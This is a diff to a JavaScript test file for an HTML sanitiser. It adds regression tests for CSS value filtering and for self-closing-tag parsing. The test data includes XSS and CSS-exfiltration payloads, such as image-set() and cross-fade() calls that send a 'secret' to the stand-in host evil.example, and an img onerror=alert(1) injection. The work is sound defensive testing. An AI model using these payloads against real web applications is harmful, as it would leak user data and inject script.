@@ -30,11 +30,12 @@
   strings are necessary but they are not proof.
   -------------------------------------------------------------------------- */
 
-import { sanitizeHtml, isCleanHtml } from '../lib/sanitize.js'
+import { sanitizeHtml, sanitizeEditorHtml, isCleanHtml } from '../lib/sanitize.js'
 import { blocksToHtml } from '../lib/exporters.js'
 
 let pass = 0, fail = 0
 const ok = (c, m) => { c ? (pass++, console.log('  ok   ' + m)) : (fail++, console.log('  FAIL ' + m)) }
+const eq = (a, b, m) => ok(a === b, `${m}  (got ${JSON.stringify(a)})`)
 
 /* Built, so this file holds no literal control bytes. */
 const ch = n => String.fromCharCode(n)
@@ -235,6 +236,68 @@ console.log('\n entities are not escaped twice')
 
   ok(sanitizeHtml('<a href="https://x.com/?a=1&amp;b=2">q</a>').includes('a=1&amp;b=2'),
      'a query string in an href survives — double-escaping it produced a link that 404s')
+}
+
+console.log('\n  CSS values: the function list is an allowlist now')
+{
+  /* THE PROPERTY LIST WAS AN ALLOWLIST AND THE VALUE CHECK WAS NOT.
+
+     CSS_VALUE_BAD banned one spelling — `url(` — while CSS_VALUE_OK permitted
+     quotes, parentheses and slashes. CSS has other ways to name an image, and
+     image-set() takes a plain string, so this reached the network on render
+     with no interaction and no `url(` anywhere in it. */
+  const exfil = [
+    ["image-set",         "background:image-set('//evil.example/p.png?q=secret' 1x)"],
+    ["-webkit-image-set", "background:-webkit-image-set('//evil.example/p.png' 1x)"],
+    ["cross-fade",        "background:cross-fade(url('//evil.example/a.png') 50%)"],
+    ["image()",           "background:image('//evil.example/a.png')"],
+    ["src()",             "background:src('//evil.example/a.png')"],
+    ["element()",         "background:element('#x')"],
+    ["paint()",           "background:paint(evil)"],
+    ["url() itself",      "background:url('//evil.example/a.png')"],
+  ]
+  for (const [name, decl] of exfil) {
+    const out = sanitizeEditorHtml(`<span style="${decl}">.</span>`)
+    ok(!/evil\.example|image-set|cross-fade|paint\(|element\(|url\(/i.test(out),
+       `${name} is dropped — an unrecognised CSS function must not survive into a style attribute`)
+  }
+
+  /* And the declarations the editor actually emits still survive, or the fix
+     would be a different bug: a colour picker that silently does nothing. */
+  ok(sanitizeEditorHtml('<span style="color:#CD4037">red</span>').includes('color:#CD4037'),
+     'a hex colour still survives')
+  ok(sanitizeEditorHtml('<span style="color:rgb(205, 64, 55)">red</span>').includes('rgb(205, 64, 55)'),
+     'and so does rgb(), which is on the function allowlist')
+}
+
+console.log('\n  a trailing slash does not close a non-void element')
+{
+  /* In HTML a solidus before `>` on a non-void element is a parse error that
+     browsers IGNORE — `<a/>` OPENS an anchor. The sanitiser believed it, so
+     the tag never entered the balancing stack, no `</a>` was ever emitted, and
+     the browser adopted the rest of the note as the link's children. One
+     hidden token turned a whole paragraph into a link to somewhere else. */
+  const payload = '<a href="https://evil.example/" />Quarterly numbers look fine to me.'
+  for (const [name, fn] of [['export', sanitizeHtml], ['editor', sanitizeEditorHtml]]) {
+    const out = fn(payload)
+    ok(out.includes('</a>'),
+       `${name} profile closes the anchor — without this the rest of the block becomes link text`)
+    ok(out.trimEnd().endsWith('</a>'),
+       `${name} profile balances at the very end, after the adopted text`)
+  }
+
+  /* The same wrong premise switched off the content drop for the most
+     dangerous elements in the list. */
+  eq(sanitizeEditorHtml('<svg/><img src=x onerror=alert(1)>'), '',
+     'a self-closed <svg/> does NOT re-enable the dropped subtree')
+  eq(sanitizeEditorHtml('<style/>body{}</style>'), '',
+     'nor does a self-closed <style/>')
+
+  /* Idempotence, which this bug quietly broke: the second pass appended the
+     `</a>` the first one never wrote. */
+  const once = sanitizeHtml(payload)
+  eq(sanitizeHtml(once), once,
+     'sanitising twice is the same as sanitising once — an unbalanced output is not a fixed point')
 }
 
 console.log(`\n  ${pass} passed, ${fail} failed`)
